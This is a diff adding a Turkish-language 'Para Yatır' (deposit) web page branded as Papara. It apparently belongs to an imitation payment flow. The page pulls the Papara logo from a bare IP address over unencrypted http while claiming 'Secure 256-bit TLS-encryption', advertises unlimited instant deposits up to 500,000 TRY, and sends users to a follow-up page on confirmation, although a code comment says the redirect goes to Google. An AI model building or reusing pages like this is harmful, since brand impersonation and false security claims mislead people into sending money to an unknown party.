@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Para Yatır</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            border-radius: 10px;
+            text-align: center;
+            width: 100%;
+            max-width: 1000px;
+            position: relative;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 24px; /* Boyutu küçülttük */
+            text-align: left;
+        }
+        .important-note {
+            background-color: #ffcc00;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 60px; /* Başlığın altına yer açtık */
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .logo {
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .logo img {
+            width: 100px; /* Simgeyi büyüttük */
+            height: auto;
+        }
+        .button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 30px; /* Butonu genişlettik ve büyüttük */
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+        .security-note {
+            font-size: 14px;
+            color: #666;
+            clear: both; /* Akışın bozulmaması için */
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 600px; /* Genişliği arttırdık */
+            background-color: white;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            padding: 20px;
+            text-align: center;
+            border-radius: 10px;
+        }
+        .popup.active {
+            display: block;
+        }
+        .popup button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            border: none;
+            background-color: #4deb14;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+    <script>
+        function showPopup() {
+            document.getElementById('popup').classList.add('active');
+        }
+
+        function closePopup() {
+            document.getElementById('popup').classList.remove('active');
+            window.location.href = "../tr/papara2.html"; // Google'a yönlendir
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>Para Yatır</h1>
+        <div class="logo">
+            <img src="http://92.113.21.238/pw/papara.png" alt="Papara">
+        </div>
+        <div class="important-note">
+            ÖNEMLİ NOT: Papara hesabınız ile günlük limitsiz adet ve miktarda, tek seferde TRY 10.00 - 500,000.00 arasında anlık yatırım gerçekleştirebilirsiniz.
+        </div>
+        <a href="javascript:void(0)" class="button" onclick="showPopup()">Para Yatır</a>
+        <p class="security-note">Secure 256-bit TLS-encryption</p>
+    </div>
+    <div class="popup" id="popup">
+        <h2>Hesabınıza yatırım yapacaksınız</h2>
+        <button onclick="closePopup()">Para Yatırmayı Onayla</button>
+    </div>
+</body>
+</html>
